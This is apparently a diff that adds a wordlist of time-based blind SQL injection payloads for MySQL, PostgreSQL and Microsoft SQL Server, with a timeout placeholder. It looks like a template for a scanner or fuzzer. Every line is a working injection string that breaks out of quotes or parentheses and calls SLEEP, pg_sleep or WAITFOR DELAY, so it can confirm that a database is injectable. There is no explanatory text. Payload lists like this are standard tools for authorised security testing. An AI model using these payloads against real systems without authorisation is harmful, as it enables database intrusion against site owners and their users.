@@ -1,0 +1,85 @@
+"0"XOR(if(now()=sysdate()%2Csleep(%__TIME_OUT__%)%2C0))XOR"Z"
+0'XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR'Z
+0\"XOR(if(now()=sysdate(),sleep(%__TIME_OUT__%),0))XOR\"Z
+1 or pg_sleep(%__TIME_OUT__%)--
+1) or pg_sleep(%__TIME_OUT__%)--
+1)) or pg_sleep(%__TIME_OUT__%)--
+1 or sleep(%__TIME_OUT__%)#
+1) or sleep(%__TIME_OUT__%)#
+1)) or sleep(%__TIME_OUT__%)#
+1') WAITFOR DELAY '%__TIME_OUT__%' AND ('1337'='1337
+1) WAITFOR DELAY '%__TIME_OUT__%' AND (1337=1337
+';%5waitfor%5delay%5'%__TIME_OUT__%'%5--%5
+AND (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))bAKL) AND 'vRxe'='vRxe
+AND (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))nQIP)#
+AND (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))nQIP)--
+AND (SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))YjoC) AND '%'='
+AnD SLEEP(%__TIME_OUT__%)
+AnD SLEEP(%__TIME_OUT__%)#
+AnD SLEEP(%__TIME_OUT__%)--
+' AnD SLEEP(%__TIME_OUT__%) ANd '1
+and WAITFOR DELAY '%__TIME_OUT__%'
+and WAITFOR DELAY '%__TIME_OUT__%'--
+") IF (1=1) WAITFOR DELAY '%__TIME_OUT__%'--
+ORDER BY SLEEP(%__TIME_OUT__%)
+ORDER BY SLEEP(%__TIME_OUT__%)#
+ORDER BY SLEEP(%__TIME_OUT__%)--
+" or pg_sleep(%__TIME_OUT__%)--
+") or pg_sleep(%__TIME_OUT__%)--
+")) or pg_sleep(%__TIME_OUT__%)--
+' or pg_sleep(%__TIME_OUT__%)--
+') or pg_sleep(%__TIME_OUT__%)--
+')) or pg_sleep(%__TIME_OUT__%)--
+or pg_SLEEP(%__TIME_OUT__%)
+or pg_SLEEP(%__TIME_OUT__%)#
+or pg_SLEEP(%__TIME_OUT__%)--
+" or sleep(%__TIME_OUT__%)#
+" or sleep(%__TIME_OUT__%)="
+") or sleep(%__TIME_OUT__%)="
+")) or sleep(%__TIME_OUT__%)="
+' or sleep(%__TIME_OUT__%)#
+' or sleep(%__TIME_OUT__%)='
+') or sleep(%__TIME_OUT__%)='
+')) or sleep(%__TIME_OUT__%)='
+or SLEEP(%__TIME_OUT__%)
+or SLEEP(%__TIME_OUT__%)#
+or SLEEP(%__TIME_OUT__%)--
+or SLEEP(%__TIME_OUT__%)="
+or SLEEP(%__TIME_OUT__%)='
+or WAITFOR DELAY '%__TIME_OUT__%'
+or WAITFOR DELAY '%__TIME_OUT__%'--
+pg_sleep(%__TIME_OUT__%)--
+pg_SLEEP(%__TIME_OUT__%)
+pg_SLEEP(%__TIME_OUT__%)#
+pg_SLEEP(%__TIME_OUT__%)--
+(SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(%__TIME_OUT__%)))ecMj)--
+sleep(%__TIME_OUT__%)#
+&&SLEEP(%__TIME_OUT__%)
+&&SLEEP(%__TIME_OUT__%)#
+&&SLEEP(%__TIME_OUT__%)--
++ SLEEP(%__TIME_OUT__%) + '
+SLEEP(%__TIME_OUT__%)#
+SLEEP(%__TIME_OUT__%)--
+SLEEP(%__TIME_OUT__%)="
+SLEEP(%__TIME_OUT__%)='
+'&&SLEEP(%__TIME_OUT__%)&&'1
+SLEEP(%__TIME_OUT__%)/*' or SLEEP(%__TIME_OUT__%) or '" or SLEEP(%__TIME_OUT__%) or "*/
+"));waitfor delay '%__TIME_OUT__%'--
+");waitfor delay '%__TIME_OUT__%'--
+";waitfor delay '%__TIME_OUT__%'--
+'));waitfor delay '%__TIME_OUT__%'--
+');waitfor delay '%__TIME_OUT__%'--
+';waitfor delay '%__TIME_OUT__%'--
+));waitfor delay '%__TIME_OUT__%'--
+);waitfor delay '%__TIME_OUT__%'--
+;waitfor delay '%__TIME_OUT__%'--
+waitfor delay '%__TIME_OUT__%'
+waitfor delay '%__TIME_OUT__%'#
+waitfor delay '%__TIME_OUT__%'--
+") WAITFOR DELAY '%__TIME_OUT__%'--
+%' WAITFOR DELAY '%__TIME_OUT__%'--
+'))) WAITFOR DELAY '%__TIME_OUT__%'--
+';WAITFOR DELAY '%__TIME_OUT__%'--
